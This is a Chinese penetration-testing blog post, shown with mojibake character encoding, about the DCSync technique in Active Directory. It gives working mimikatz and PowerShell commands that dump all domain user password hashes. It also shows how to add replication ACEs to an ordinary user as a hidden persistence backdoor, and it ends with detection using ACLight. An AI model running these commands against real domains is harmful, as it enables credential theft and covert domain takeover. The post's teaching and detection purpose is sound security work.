I"®&<h2 id="0x00-å‰è¨€">0x00 å‰è¨€</h2>
<hr />

<p>DCSyncæ˜¯åŸŸæ¸—é€ä¸­ç»å¸¸ä¼šç”¨åˆ°çš„æŠ€æœ¯ï¼Œæœ¬æ–‡ä¼šå¯¹å¼€æºçš„èµ„æ–™è¿›è¡Œæ•´ç†ï¼Œç»“åˆè‡ªå·±çš„ç»éªŒï¼Œæ€»ç»“åˆ©ç”¨å’Œé˜²å¾¡æ£€æµ‹çš„æ–¹æ³•</p>

<h2 id="0x01-ç®€ä»‹">0x01 ç®€ä»‹</h2>
<hr />

<p>æœ¬æ–‡å°†è¦ä»‹ç»ä»¥ä¸‹å†…å®¹ï¼š</p>

<ul>
  <li>åˆ©ç”¨DCSyncå¯¼å‡ºåŸŸå†…æ‰€æœ‰ç”¨æˆ·hashçš„æ–¹æ³•</li>
  <li>åˆ©ç”¨DCSyncåœ¨åŸŸå†…ç»´æŒæƒé™çš„æ–¹æ³•</li>
  <li>è‡ªåŠ¨åŒ–æ£€æµ‹DCSyncåé—¨çš„æ–¹æ³•</li>
</ul>

<h2 id="0x02-åˆ©ç”¨dcsyncå¯¼å‡ºåŸŸå†…æ‰€æœ‰ç”¨æˆ·hashçš„æ–¹æ³•">0x02 åˆ©ç”¨DCSyncå¯¼å‡ºåŸŸå†…æ‰€æœ‰ç”¨æˆ·hashçš„æ–¹æ³•</h2>
<hr />

<p>DCSyncæ˜¯mimikatzåœ¨2015å¹´æ·»åŠ çš„ä¸€ä¸ªåŠŸèƒ½ï¼Œç”±Benjamin DELPY gentilkiwiå’ŒVincent LE TOUXå…±åŒç¼–å†™ï¼Œèƒ½å¤Ÿç”¨æ¥å¯¼å‡ºåŸŸå†…æ‰€æœ‰ç”¨æˆ·çš„hash</p>

<p><strong>åˆ©ç”¨æ¡ä»¶ï¼š</strong></p>

<p>è·å¾—ä»¥ä¸‹ä»»ä¸€ç”¨æˆ·çš„æƒé™ï¼š</p>

<ul>
  <li>Administratorsç»„å†…çš„ç”¨æˆ·</li>
  <li>Domain Adminsç»„å†…çš„ç”¨æˆ·</li>
  <li>Enterprise Adminsç»„å†…çš„ç”¨æˆ·</li>
  <li>åŸŸæ§åˆ¶å™¨çš„è®¡ç®—æœºå¸æˆ·</li>
</ul>

<p><strong>åˆ©ç”¨åŸç†ï¼š</strong></p>

<p>åˆ©ç”¨DRS(Directory Replication Service)åè®®é€šè¿‡IDL_DRSGetNCChangesä»åŸŸæ§åˆ¶å™¨å¤åˆ¶ç”¨æˆ·å‡­æ®</p>

<p>å‚è€ƒèµ„æ–™ï¼š
https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-drsr/f977faaa-673e-4f66-b9bf-48c640241d47</p>

<p><strong>å®ç°ä»£ç ï¼š</strong></p>

<p>https://github.com/gentilkiwi/mimikatz/blob/master/mimikatz/modules/lsadump/kuhl_m_lsadump_dc.c#L27</p>

<p><strong>åˆ©ç”¨æ–¹æ³•ï¼š</strong></p>

<h4 id="1ä½¿ç”¨mimikatz">1.ä½¿ç”¨mimikatz</h4>

<p>å¯¼å‡ºåŸŸå†…æ‰€æœ‰ç”¨æˆ·çš„hashï¼š</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mimikatz.exe "lsadump::dcsync /domain:test.com /all /csv" exit
</code></pre></div></div>

<p>å¯¼å‡ºåŸŸå†…administratorå¸æˆ·çš„hashï¼š</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mimikatz.exe "lsadump::dcsync /domain:test.com /user:administrator /csv" exit
</code></pre></div></div>

<h4 id="2powershellå®ç°">2.powershellå®ç°</h4>

<p>https://gist.github.com/monoxgas/9d238accd969550136db</p>

<p>é€šè¿‡Invoke-ReflectivePEinjectionè°ƒç”¨mimikatz.dllä¸­çš„dcsyncåŠŸèƒ½</p>

<p>å¯¼å‡ºåŸŸå†…æ‰€æœ‰ç”¨æˆ·çš„hashï¼š</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Invoke-DCSync -DumpForest | ft -wrap -autosize
</code></pre></div></div>

<p>å¯¼å‡ºåŸŸå†…administratorå¸æˆ·çš„hashï¼š</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Invoke-DCSync -DumpForest -Users @("administrator") | ft -wrap -autosize
</code></pre></div></div>

<p><strong>æ³¨ï¼š</strong></p>

<p>è·å¾—äº†åŸŸå†…ç”¨æˆ·çš„hashåï¼Œè¿›ä¸€æ­¥åˆ©ç”¨å¯å‚è€ƒä¹‹å‰çš„æ–‡ç« ï¼š</p>

<p><a href="https://3gstudent.github.io/%E5%9F%9F%E6%B8%97%E9%80%8F-Pass-The-Hash%E7%9A%84%E5%AE%9E%E7%8E%B0">ã€ŠåŸŸæ¸—é€â€”â€”Pass The Hashçš„å®ç°ã€‹</a></p>

<p><a href="https://3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-Pass-the-Hash-with-Remote-Desktop(Restricted-Admin-mode)">ã€Šæ¸—é€æŠ€å·§â€”â€”Pass the Hash with Remote Desktop(Restricted Admin mode)ã€‹</a></p>

<p>ã€ŠåŸŸæ¸—é€â€”â€”Pass The Hash &amp; Pass The Keyã€‹</p>

<h2 id="0x03-åˆ©ç”¨dcsyncåœ¨åŸŸå†…ç»´æŒæƒé™çš„æ–¹æ³•">0x03 åˆ©ç”¨DCSyncåœ¨åŸŸå†…ç»´æŒæƒé™çš„æ–¹æ³•</h2>
<hr />

<p><strong>åˆ©ç”¨æ¡ä»¶ï¼š</strong></p>

<p>è·å¾—ä»¥ä¸‹ä»»ä¸€ç”¨æˆ·çš„æƒé™ï¼š</p>

<ul>
  <li>Domain Adminsç»„å†…çš„ç”¨æˆ·</li>
  <li>Enterprise Adminsç»„å†…çš„ç”¨æˆ·</li>
</ul>

<p><strong>åˆ©ç”¨åŸç†ï¼š</strong></p>

<p>å‘åŸŸå†…çš„ä¸€ä¸ªæ™®é€šç”¨æˆ·æ·»åŠ å¦‚ä¸‹ä¸‰æ¡ACE(Access Control Entries)ï¼š</p>

<ul>
  <li>DS-Replication-Get-Changes(GUID:1131f6aa-9c07-11d1-f79f-00c04fc2dcd2)</li>
  <li>DS-Replication-Get-Changes-All(GUID:1131f6ad-9c07-11d1-f79f-00c04fc2dcd2)</li>
  <li>DS-Replication-Get-Changes(GUID:89e95b76-444d-4c62-991a-0facbeda640c)</li>
</ul>

<p>è¯¥ç”¨æˆ·å³å¯è·å¾—åˆ©ç”¨DCSyncå¯¼å‡ºåŸŸå†…æ‰€æœ‰ç”¨æˆ·hashçš„æƒé™</p>

<p><strong>å®ç°ä»£ç ï¼š</strong></p>

<p>https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1#L8270</p>

<p><strong>åˆ©ç”¨æ–¹æ³•ï¼š</strong></p>

<p>æ·»åŠ ACEçš„å‘½ä»¤å¦‚ä¸‹ï¼š</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Add-DomainObjectAcl -TargetIdentity "DC=test,DC=com" -PrincipalIdentity test1 -Rights DCSync -Verbose
</code></pre></div></div>

<p><strong>è¡¥å……ï¼š</strong></p>

<p>åˆ é™¤ACEçš„å‘½ä»¤ï¼š</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Remove-DomainObjectAcl -TargetIdentity "DC=test,DC=com" -PrincipalIdentity test1 -Rights DCSync -Verbose
</code></pre></div></div>

<p><strong>æ³¨ï¼š</strong></p>

<p>å…³äºæ›´å¤šACLçš„å†…å®¹å¯å‚è€ƒä¹‹å‰çš„æ–‡ç« ï¼š<a href="https://3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-Windows%E4%B8%8B%E7%9A%84Access-Control-List">ã€Šæ¸—é€æŠ€å·§â€”â€”Windowsä¸‹çš„Access Control Listã€‹</a></p>

<p>ä½¿ç”¨åŸŸç”¨æˆ·test1è°ƒç”¨DCSyncçš„æ–¹æ³•å¦‚ä¸‹ï¼š</p>

<h4 id="1åœ¨åŸŸå†…ä¸€å°ç™»å½•äº†test1ç”¨æˆ·çš„ä¸»æœºä¸Šé¢ç›´æ¥ä½¿ç”¨mimikatzçš„dcsyncåŠŸèƒ½">1.åœ¨åŸŸå†…ä¸€å°ç™»å½•äº†test1ç”¨æˆ·çš„ä¸»æœºä¸Šé¢ï¼Œç›´æ¥ä½¿ç”¨mimikatzçš„DCSyncåŠŸèƒ½</h4>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mimikatz.exe privilege::debug "lsadump::dcsync /domain:test.com /all /csv" exit
</code></pre></div></div>

<h4 id="2ä½¿ç”¨runaså®ç°ç™»å½•test1ç”¨æˆ·å†ä½¿ç”¨dcsync">2.ä½¿ç”¨runaså®ç°ç™»å½•test1ç”¨æˆ·ï¼Œå†ä½¿ç”¨DCSync</h4>

<p>(1)å¼¹å‡ºcmd</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>echo 123456789 | runas /noprofile /user:test\test1 cmd
</code></pre></div></div>

<p>å¼¹å‡ºçš„cmdä¸‹æ‰§è¡Œå¦‚ä¸‹å‘½ä»¤ï¼š</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mimikatz.exe privilege::debug "lsadump::dcsync /domain:test.com /all /csv" exit
</code></pre></div></div>

<p>(2)ä¸å¼¹æ¡†å®ç°</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>echo 123456789 | runas /noprofile /user:test\test1 c:\test\1.bat
</code></pre></div></div>

<p>1.batçš„å†…å®¹å¦‚ä¸‹:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>c:\test\mimikatz.exe privilege::debug "lsadump::dcsync /domain:test.com /user:administrator /csv" exit&gt;c:\test\1.txt
</code></pre></div></div>

<p><strong>æ³¨ï¼š</strong></p>

<p>åŒç±»çš„å·¥å…·è¿˜æœ‰lsrunasã€lsrunaseå’ŒCPAU</p>

<h4 id="3ä½¿ç”¨powershellå®ç°ç™»å½•test1ç”¨æˆ·å†ä½¿ç”¨dcsync">3.ä½¿ç”¨powershellå®ç°ç™»å½•test1ç”¨æˆ·ï¼Œå†ä½¿ç”¨DCSync</h4>

<p>(1)å¼¹å‡ºcmd</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$uname="test\test1"                                                      
$pwd=ConvertTo-SecureString "12345678" -AsPlainText â€“Force                   
$cred=New-Object System.Management.Automation.PSCredential($uname,$pwd)        
Start-Process -FilePath "cmd.exe" -Credential $cred  
</code></pre></div></div>

<p>å¼¹å‡ºçš„cmdä¸‹æ‰§è¡Œå¦‚ä¸‹å‘½ä»¤ï¼š</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mimikatz.exe privilege::debug "lsadump::dcsync /domain:test.com /user:administrator /csv" exit
</code></pre></div></div>

<p>(2)ä¸å¼¹æ¡†å®ç°</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$uname="test\test1"                                                      
$pwd=ConvertTo-SecureString "12345678" -AsPlainText â€“Force                   
$cred=New-Object System.Management.Automation.PSCredential($uname,$pwd)        
Start-Process -FilePath "c:\test\1.bat" -Credential $cred
</code></pre></div></div>

<p>1.batçš„å†…å®¹å¦‚ä¸‹:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>c:\test\mimikatz.exe privilege::debug "lsadump::dcsync /domain:test.com /user:administrator /csv" exit&gt;c:\test\1.txt
</code></pre></div></div>

<p><strong>æ³¨ï¼š</strong></p>

<p>ä½¿ç”¨wmicåœ¨æœ¬æœºå®ç°ç™»å½•ç”¨æˆ·test1ä¼šå¤±è´¥ï¼Œé”™è¯¯å¦‚ä¸‹ï¼š</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ERROR:
Description = User credentials cannot be used for local connections
</code></pre></div></div>

<h2 id="0x04-è‡ªåŠ¨åŒ–æ£€æµ‹dcsyncåé—¨çš„æ–¹æ³•">0x04 è‡ªåŠ¨åŒ–æ£€æµ‹DCSyncåé—¨çš„æ–¹æ³•</h2>
<hr />

<p>å…·æœ‰é«˜æƒé™ä½†ä¸åœ¨é«˜æƒé™ç»„çš„ç”¨æˆ·è¢«ç§°ä¹‹ä¸ºShadow Adminï¼Œä¾‹å¦‚0x03ä¸­çš„åŸŸç”¨æˆ·test1ï¼Œä»…é€šè¿‡æŸ¥è¯¢é«˜æƒé™ç»„çš„æˆå‘˜æ— æ³•å‘ç°åŸŸå†…çš„Shadow Admin</p>

<p><strong>æ£€æµ‹åŸç†ï¼š</strong></p>

<p>æšä¸¾Active Directoryä¸­æ‰€æœ‰ç”¨æˆ·çš„ACLï¼Œæ ‡è®°å‡ºç‰¹æƒå¸æˆ·</p>

<p><strong>å®ç°ä»£ç ï¼š</strong></p>

<p>https://github.com/cyberark/ACLight</p>

<p><strong>åˆ©ç”¨æ¡ä»¶ï¼š</strong></p>

<ul>
  <li>Powershell v3.0</li>
  <li>åŸŸå†…æ™®é€šç”¨æˆ·æƒé™</li>
</ul>

<p><strong>æ£€æµ‹æ–¹æ³•ï¼š</strong></p>

<p>æ‰§è¡Œé¡¹ç›®ä¸­çš„Execute-ACLight2.bat</p>

<p>ç”Ÿæˆä¸‰ä¸ªæ–‡ä»¶ï¼š</p>

<ul>
  <li>Privileged Accounts - Layers Analysis.txt</li>
  <li>Privileged Accounts Permissions - Final Report.csv</li>
  <li>Privileged Accounts Permissions - Irregular Accounts.csv</li>
</ul>

<p>æ–‡ä»¶ä¸­ä¼šæ˜¾ç¤ºå‡ºæ‰€æœ‰ç‰¹æƒå¸æˆ·</p>

<p>ç»æµ‹è¯•ï¼ŒACLightèƒ½å¤Ÿæ£€æµ‹å‡ºè¢«æ·»åŠ DCSyncæƒé™çš„ç”¨æˆ·test1</p>

<h2 id="0x05-å°ç»“">0x05 å°ç»“</h2>
<hr />

<p>æœ¬æ–‡ä»‹ç»äº†åŸŸæ¸—é€ä¸­DCSyncçš„åˆ©ç”¨å’Œè‡ªåŠ¨åŒ–æ£€æµ‹çš„æ–¹æ³•ï¼Œç«™åœ¨é˜²å¾¡çš„è§’åº¦ï¼Œå»ºè®®ä½¿ç”¨ACLightå¯¹åŸŸç¯å¢ƒçš„ç”¨æˆ·ACLè¿›è¡Œæ£€æµ‹</p>

<hr />

<p><a href="https://github.com/3gstudent/feedback/issues/new">LEAVE A REPLY</a></p>

:ET